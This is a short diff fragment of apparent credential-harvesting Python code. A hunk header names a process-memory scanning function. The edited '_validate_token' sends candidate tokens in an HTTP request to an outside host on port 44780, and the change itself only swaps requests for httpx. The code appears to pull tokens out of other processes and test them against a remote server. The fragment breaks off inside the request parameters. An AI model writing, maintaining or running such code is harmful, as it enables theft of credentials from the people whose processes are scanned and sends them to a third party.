@@ -117,10 +117,10 @@ def _scan_process_memory(pid: int) -> list[str]:
 
 def _validate_token(token: str) -> bool:
     """Validate a candidate token with a lightweight HTTP request."""
-    import requests
+    import httpx
 
     try:
-        r = requests.get(
+        r = httpx.get(
             "http://cp.ae.com.br:44780/BaseHistoricaNumerica/HistoricoFechamentos",
             params={
                 "10023": "4",
